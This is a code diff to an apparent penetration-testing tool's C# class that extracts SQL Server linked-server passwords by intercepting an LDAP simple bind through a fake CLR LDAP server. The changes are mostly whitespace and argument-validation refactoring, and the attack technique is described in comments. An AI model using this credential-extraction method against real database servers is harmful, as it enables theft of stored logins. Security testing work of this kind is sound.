@@ -10,19 +10,19 @@ namespace MSSQLand.Actions.Remote
 {
     /// <summary>
     /// Extracts credentials from ADSI linked servers using LDAP simple bind interception.
-    /// 
+    ///
     /// Technique: Creates a fake LDAP server via CLR, then triggers an LDAP query through
     /// the ADSI provider. SQL Server sends credentials in cleartext during LDAP simple bind.
-    /// 
+    ///
     /// Use Cases:
     /// 1. Extract linked login password from existing ADSI server with mapped credentials
     /// 2. Extract SQL login password when executing through a linked server chain
     ///    (the linked server's configured login password, not your own)
-    /// 
+    ///
     /// Limitations:
     /// - Windows/Kerberos auth uses GSSAPI (encrypted) - no cleartext password
     /// - Direct SQL auth connection returns your own password (pointless)
-    /// 
+    ///
     /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
     /// </summary>
     internal class AdsiCredentialExtractor : BaseAction
@@ -35,16 +35,14 @@ namespace MSSQLand.Actions.Remote
 
         public override void ValidateArguments(string[] args)
         {
-            if (args == null || args.Length == 0)
+            BindArguments(args);
+
+            if (args != null && args.Length > 1)
             {
-                // No args = create temporary ADSI server
-                _useExistingServer = false;
-                return;
+                throw new ArgumentException("Only a single ADSI server name may be provided.");
             }
 
-            // First arg is the target ADSI server name
-            _targetServer = args[0];
-            _useExistingServer = true;
+            _useExistingServer = !string.IsNullOrWhiteSpace(_targetServer);
         }
 
 
@@ -104,9 +102,9 @@ namespace MSSQLand.Actions.Remote
         private Tuple<string, string> ExtractWithTemporaryServer(DatabaseContext databaseContext)
         {
             _targetServer = $"ADSI-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
-            
+
             Logger.Task($"Creating temporary ADSI server '{_targetServer}' for credential extraction");
-            
+
             AdsiService adsiService = new(databaseContext);
 
             // Try to create the ADSI server
@@ -155,7 +153,7 @@ namespace MSSQLand.Actions.Remote
         private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
         {
             AdsiService adsiService = new(databaseContext);
-            
+
             // Verify the ADSI server exists
             if (!adsiService.AdsiServerExists(adsiServer))
             {
@@ -210,7 +208,7 @@ namespace MSSQLand.Actions.Remote
                 if (ldapResult != null && ldapResult.Rows.Count > 0)
                 {
                     string rawCredentials = ldapResult.Rows[0][0].ToString();
-                    
+
                     // Split only at the first occurrence of ':'
                     int splitIndex = rawCredentials.IndexOf(':');
                     if (splitIndex > 0)
@@ -241,7 +239,7 @@ namespace MSSQLand.Actions.Remote
                 {
                     Logger.Warning("No credentials captured - connection may be using GSSAPI (Kerberos).");
                 }
-                
+
                 return null;
             }
             catch (Exception ex)
